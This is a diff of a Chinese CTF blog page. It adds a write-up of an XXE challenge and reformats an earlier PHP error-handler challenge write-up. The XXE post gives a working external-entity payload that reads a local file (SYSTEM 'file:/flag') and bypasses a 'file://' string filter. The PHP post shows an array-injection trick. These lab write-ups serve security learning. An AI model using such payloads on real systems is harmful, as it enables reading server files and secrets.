@@ -18,7 +18,7 @@
         <link rel="prev" href="../unicode/">
       
       
-        <link rel="next" href="../git%E6%B3%84%E9%9C%B2/">
+        <link rel="next" href="../xxe/">
       
       
         
@@ -2253,6 +2253,8 @@
       
         
       
+        
+      
     
     
     
@@ -2818,6 +2820,36 @@
 
       </a>
       
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../xxe/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
     </li>
   
 
@@ -3546,6 +3578,177 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2026-11-19 18:45:00+00:00">2026-11-19</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../xxe/" class="md-meta__link">XXE</a>, 
+              <a href="./" class="md-meta__link">Web</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="flag"><a class="toclink" href="../../myctf-xxe-shi-jian/">海棠诗社·诗笺夹带 — 誊录官一字不改，那就把 flag 塞进诗里</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：XXE（XML 外部实体注入）— 绕过 <code>file://</code> 过滤</p>
+<p><strong>Flag</strong>：<code>MYCTF{174907b1-c480-4128-83e2-efcb839b4b33}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="../../myctf-xxe-shi-jian/#_1">题目概述</a></h3>
+<p>题目背景写得很讲究：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>诗笺不再手书，改以 XML 书就，交誊录官代为誊抄入册。
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>誊录官是个实诚人：笺上写什么，他便抄什么，一字不改。
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>听新闻社中那面小旗，就压在誊录官的案头（/flag）。
+</span></code></pre></div>
+<p><strong>“笺上写什么就抄什么，一字不改”——这就是在告诉你：服务器会</strong>原样解析并回显<strong>你提交的 XML。</strong></p>
+<p><strong>而那面小旗（flag）就在它案头，也就是 <code>/flag</code> 文件。</strong></p>
+<p><strong>所以思路很清楚：让 XML 解析器自己去读 <code>/flag</code>，再把内容抄给我。</strong></p>
+<hr />
+<h3 id="_2"><a class="toclink" href="../../myctf-xxe-shi-jian/#_2">解题过程</a></h3>
+<h4 id="step-1-js"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-1-js">Step 1：先看 JS，找到提交入口</a></h4>
+<p><strong>页面里有个输入框，但按钮背后才是关键。翻页面源码里的脚本：</strong></p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">'/tengchao'</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">'POST'</span><span class="p">,</span>
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="s1">'Content-Type'</span><span class="o">:</span><span class="w"> </span><span class="s1">'application/xml'</span><span class="p">},</span>
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'x'</span><span class="p">).</span><span class="nx">value</span>
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a><span class="w">  </span><span class="p">})</span>
+</span></code></pre></div>
+<p><strong>三件事一眼看清：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>接口      POST /tengchao
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>类型      application/xml
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>请求体    输入框 #x 里的全部内容，原样提交
+</span></code></pre></div>
+<p><strong>也就是说：输入框里写什么 XML，服务器就拿什么去解析。</strong></p>
+<h4 id="step-2"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-2">Step 2：先确认后端语言（这一步很重要）</a></h4>
+<p><strong>我第一反应是 PHP 环境，于是去试 <code>php://filter</code>。</strong></p>
+<p><strong>结果报错里的堆栈信息显示是</strong>Java<strong>。</strong></p>
+<p><strong>这一步的价值：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>报错暴露语言 → 决定用哪套绕过思路
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>PHP  的伪协议        php://filter、php://input
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>Java 的 XML 解析     URI 处理更宽松，过滤常常形同虚设
+</span></code></pre></div>
+<p><strong>很多时候“过滤能不能绕”不取决于过滤写得严不严，而取决于</strong>解析器是谁<strong>。</strong></p>
+<h4 id="step-3file-java"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-3file-java">Step 3：<code>file://</code> 被过滤，但 Java 不认这个死理</a></h4>
+<p><strong>直接写 <code>file:///flag</code>，被拦了——代码里过滤了 <code>file://</code> 这个字符串。</strong></p>
+<p><strong>但 Java 的 XML 解析器在解析 <code>SYSTEM</code> 后面的值时，是按 <strong>URI</strong> 处理的，对斜杠数量并不敏感：</strong></p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>SYSTEM<span class="w"> </span>"file:///flag"<span class="w">    </span>←<span class="w"> </span>被过滤
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>SYSTEM<span class="w"> </span>"file:/flag"<span class="w">      </span>←<span class="w"> </span>只有一个斜杠，能过
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>SYSTEM<span class="w"> </span>"/flag"<span class="w">           </span>←<span class="w"> </span>干脆不带协议，也能过（当作绝对路径）
+</span></code></pre></div>
+<p><strong>所以这里不是“绕过过滤技巧”，是“过滤器假设错了写法”。</strong>它以为外部实体只有 <code>file://</code> 一种形态。</p>
+<h4 id="step-4-payload"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-4-payload">Step 4：写 payload</a></h4>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="cp">&lt;!DOCTYPE 诗筏 [ &lt;!ENTITY x SYSTEM "file:/flag"&gt;</span><span class="w"> </span>]&gt;
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="nt">&lt;诗筏&gt;</span>
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="w">  </span><span class="nt">&lt;题名&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/题名&gt;</span>
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="w">  </span><span class="nt">&lt;落款&gt;&lt;/落款&gt;</span>
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>出浴太真冰作影<span class="nt">&lt;/句&gt;</span>
+</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>捧心西子玉为魂<span class="nt">&lt;/句&gt;</span>
+</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a><span class="nt">&lt;/诗筏&gt;</span>
+</span></code></pre></div>
+<p><strong>三部分缺一不可：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>① &lt;!DOCTYPE ... [ &lt;!ENTITY x SYSTEM "file:/flag"&gt; ]&gt;
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>   在 DTD 里声明一个实体 x，内容来自 file:/flag
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>② &lt;题名&gt;&amp;x;&lt;/题名&gt;
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>   在正文里**引用**它 —— 不引用，解析器根本不会去读文件
+</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>
+</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>③ 保留原有的结构
+</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>   服务器要按模板把内容抄进“誊抄入册”，结构不对就走不到回显
+</span></code></pre></div>
+<p><strong>最容易漏的是第 ②：</strong>只声明实体、不引用，服务器什么都不会给你。**</p>
+<h4 id="step-5"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-5">Step 5：提交，读结果</a></h4>
+<p><strong>把整段 XML 填进输入框，点提交。</strong></p>
+<p><strong>“誊抄入册”那块原样回显了：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>题名：MYCTF{174907b1-c480-4128-83e2-efcb839b4b33}
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>落款：
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>出浴太真冰作影
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>捧心西子玉为魂
+</span></code></pre></div>
+<p><strong>因为 <code>&amp;x;</code> 在解析时被替换成了 <code>/flag</code> 文件的内容。</strong></p>
+<hr />
+<table>
+<thead>
+<tr>
+<th>关键点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>入口</td>
+<td><code>POST /tengchao</code>，<code>Content-Type: application/xml</code>，body 完全可控</td>
+</tr>
+<tr>
+<td>判断语言</td>
+<td><code>php://filter</code> 报错 → 堆栈显示 Java</td>
+</tr>
+<tr>
+<td>Java 的宽松</td>
+<td><code>SYSTEM</code> 的值按 URI 解析，<code>file:/</code>、<code>/flag</code> 都能用</td>
+</tr>
+<tr>
+<td>过滤的误判</td>
+<td>只过滤了 <code>file://</code> 这个字符串，没想到还有别的写法</td>
+</tr>
+<tr>
+<td>XXE 三要素</td>
+<td>声明实体 → <strong>引用实体</strong> → 保持原结构走到回显</td>
+</tr>
+<tr>
+<td>文件路径</td>
+<td><code>/flag</code>（题目描述里直接给了）</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>完整 payload</summary>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="cp">&lt;!DOCTYPE 诗筏 [ &lt;!ENTITY x SYSTEM "file:/flag"&gt;</span><span class="w"> </span>]&gt;
+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a><span class="nt">&lt;诗筏&gt;</span>
+</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="w">  </span><span class="nt">&lt;题名&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/题名&gt;</span>
+</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a><span class="w">  </span><span class="nt">&lt;落款&gt;&lt;/落款&gt;</span>
+</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>出浴太真冰作影<span class="nt">&lt;/句&gt;</span>
+</span><span id="__span-35-7"><a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>捧心西子玉为魂<span class="nt">&lt;/句&gt;</span>
+</span><span id="__span-35-8"><a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a><span class="nt">&lt;/诗筏&gt;</span>
+</span></code></pre></div>
+</details>
+<details class="note">
+<summary>这题踩的坑</summary>
+<p><strong>① 只声明实体，不在正文引用</strong></p>
+<p><code>&lt;!ENTITY x SYSTEM "..."&gt;</code> 只是“登记”，<strong>解析器不会主动去读</strong>。必须在正文里写 <code>&amp;x;</code> 才会触发读取和替换。</p>
+<p><strong>② 被 <code>file://</code> 拦住就放弃</strong></p>
+<p>过滤的是<strong>字符串</strong>，不是<strong>语义</strong>。<code>file:/</code>、<code>file:</code>、直接写绝对路径，都能达到同一个效果。</p>
+<p><strong>③ 没先判断后端语言</strong></p>
+<p>PHP 的 <code>php://filter</code> 在 Java 里当然报错。<strong>报错本身就是信息</strong>——它告诉你该换哪一套思路。</p>
+<p><strong>④ 改了 XML 结构</strong></p>
+<p>服务器的模板要求特定标签（<code>&lt;题名&gt;</code>、<code>&lt;句&gt;</code>），<strong>结构改坏就走不到回显那一步</strong>，哪怕实体读到了也没用。</p>
+</details>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
           <time datetime="2026-11-03 18:30:00+00:00">2026-11-03</time></li>
         
           <li class="md-meta__item">
@@ -3580,39 +3783,39 @@
 <hr />
 <h3 id="_2"><a class="toclink" href="../../ctf2-ezphp-error-handler/#_2">解题过程</a></h3>
 <h4 id="step-1"><a class="toclink" href="../../ctf2-ezphp-error-handler/#step-1">Step 1：先读代码</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="cp">&lt;?php</span>
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="k">include</span> <span class="s2">"fl4g.php"</span><span class="p">;</span>
-</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="nv">$dest0g3</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ctf'</span><span class="p">];</span>
-</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="nv">$time</span>    <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"H"</span><span class="p">);</span>
-</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="nv">$timme</span>   <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"d"</span><span class="p">);</span>
-</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="nv">$timmme</span>  <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"i"</span><span class="p">);</span>
-</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>
-</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="k">if</span><span class="p">((</span><span class="nv">$time</span> <span class="o">&gt;</span> <span class="s2">"24"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timme</span> <span class="o">&gt;</span> <span class="s2">"31"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timmme</span> <span class="o">&gt;</span> <span class="s2">"60"</span><span class="p">)){</span>
-</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>    <span class="k">echo</span> <span class="nv">$fl4g</span><span class="p">;</span>
-</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="p">}</span><span class="k">else</span><span class="p">{</span>
-</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>    <span class="k">echo</span> <span class="s2">"Try harder!"</span><span class="p">;</span>
-</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="p">}</span>
-</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>
-</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a><span class="nb">set_error_handler</span><span class="p">(</span>
-</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a>    <span class="k">function</span><span class="p">()</span> <span class="k">use</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$fl4g</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a>        <span class="k">print</span> <span class="nv">$fl4g</span><span class="p">;</span>
-</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a>    <span class="p">}</span>
-</span><span id="__span-12-19"><a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a><span class="p">);</span>
-</span><span id="__span-12-20"><a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a><span class="nv">$fl4g</span> <span class="o">.=</span> <span class="nv">$dest0g3</span><span class="p">;</span>
-</span><span id="__span-12-21"><a id="__codelineno-12-21" name="__codelineno-12-21" href="#__codelineno-12-21"></a><span class="cp">?&gt;</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="k">include</span> <span class="s2">"fl4g.php"</span><span class="p">;</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="nv">$dest0g3</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ctf'</span><span class="p">];</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="nv">$time</span>    <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"H"</span><span class="p">);</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="nv">$timme</span>   <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"d"</span><span class="p">);</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="nv">$timmme</span>  <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"i"</span><span class="p">);</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="k">if</span><span class="p">((</span><span class="nv">$time</span> <span class="o">&gt;</span> <span class="s2">"24"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timme</span> <span class="o">&gt;</span> <span class="s2">"31"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timmme</span> <span class="o">&gt;</span> <span class="s2">"60"</span><span class="p">)){</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>    <span class="k">echo</span> <span class="nv">$fl4g</span><span class="p">;</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>    <span class="k">echo</span> <span class="s2">"Try harder!"</span><span class="p">;</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="p">}</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="nb">set_error_handler</span><span class="p">(</span>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>    <span class="k">function</span><span class="p">()</span> <span class="k">use</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$fl4g</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>        <span class="k">print</span> <span class="nv">$fl4g</span><span class="p">;</span>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>    <span class="p">}</span>
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="p">);</span>
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="nv">$fl4g</span> <span class="o">.=</span> <span class="nv">$dest0g3</span><span class="p">;</span>
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="cp">?&gt;</span>
 </span></code></pre></div>
 <h4 id="step-2-if"><a class="toclink" href="../../ctf2-ezphp-error-handler/#step-2-if">Step 2：第一个想法——绕开那个 if</a></h4>
 <p><strong><code>include</code> 已经把 <code>fl4g.php</code> 引进来了，那直接让 <code>if</code> 成立不就能输出 <code>$fl4g</code> 了吗？</strong></p>
 <p><strong>看三个判断：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>date("H")   小时   00–23     永远不可能 &gt; 24
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>date("d")   日期   01–31     永远不可能 &gt; 31
-</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>date("i")   分钟   00–59     永远不可能 &gt; 60
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>date("H")   小时   00–23     永远不可能 &gt; 24
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>date("d")   日期   01–31     永远不可能 &gt; 31
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>date("i")   分钟   00–59     永远不可能 &gt; 60
 </span></code></pre></div>
 <p><strong>三个都是“边界值本身等于上限”的情况，所以整条 <code>or</code> 永远是假。这条路封死。</strong></p>
 <h4 id="step-3"><a class="toclink" href="../../ctf2-ezphp-error-handler/#step-3">Step 3：真正的入口在下面</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="x">set_error_handler(function() use(&amp;$fl4g){ print $fl4g; });</span>
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="x">$fl4g .= $dest0g3;</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="x">set_error_handler(function() use(&amp;$fl4g){ print $fl4g; });</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="x">$fl4g .= $dest0g3;</span>
 </span></code></pre></div>
 <p><strong><code>set_error_handler</code> 注册了一个自定义处理器——</strong>只要发生能被它捕获的错误，就会执行里面的 <code>print $fl4g</code><strong>。</strong></p>
 <p><strong>而下一行就是触发器：<code>$fl4g .= $dest0g3</code>。</strong></p>
@@ -3621,17 +3824,17 @@
 <p><strong>如果传一个</strong>字符串<strong>，拼接正常，什么都不会发生。</strong></p>
 <p><strong>如果传一个</strong>数组<strong>，PHP 试图把数组转成字符串来拼接，转不了——抛出 <code>Warning: Array to string conversion</code>。</strong></p>
 <p><strong>这个 warning 被刚刚注册的处理器捕获，于是 <code>print $fl4g</code> 执行，flag 就出来了。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>POST ctf[]=1
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>→ Array to string conversion
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>→ error handler
-</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>→ 打印 $fl4g
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>POST ctf[]=1
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>→ Array to string conversion
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>→ error handler
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>→ 打印 $fl4g
 </span></code></pre></div>
 <hr />
 <h3 id="_3"><a class="toclink" href="../../ctf2-ezphp-error-handler/#_3">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>读源码 → include 了 fl4g.php，但 if 永远为假（小时≤23、日≤31、分≤59）
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>       → 往下看，set_error_handler 注册了 print $fl4g
-</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>         → 找触发器：$fl4g .= $_POST['ctf']
-</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>           → 传数组 → 拼接失败 → warning → 处理器执行 → 拿到 flag
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>读源码 → include 了 fl4g.php，但 if 永远为假（小时≤23、日≤31、分≤59）
